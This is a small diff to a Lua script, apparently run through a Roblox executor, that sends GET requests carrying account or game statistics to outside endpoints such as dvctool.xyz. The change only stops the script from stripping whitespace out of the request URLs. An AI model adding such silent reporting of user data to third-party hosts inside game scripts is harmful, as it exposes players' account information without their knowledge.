@@ -37,16 +37,16 @@ local urls = {
     "https://dvctool.xyz/api/upload_trackstat.php?",
     getgenv().URL .. "/api/v1/check_account_rss?",
 }
-local function removeSpaces(str)
+function removeSpaces(str)
     return str:gsub("%s+", "")
 end
 local function sendRequest(data, prefix)
     local qs = mqs(data, prefix)
     for _, url in ipairs(urls) do
         print("requesting", url, qs)
-		print(removeSpaces(url..qs))
+		print(url..qs)
         request({
-            Url = removeSpaces(url..qs)
+            Url = url .. qs,
             Method = "GET",
             Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
         })
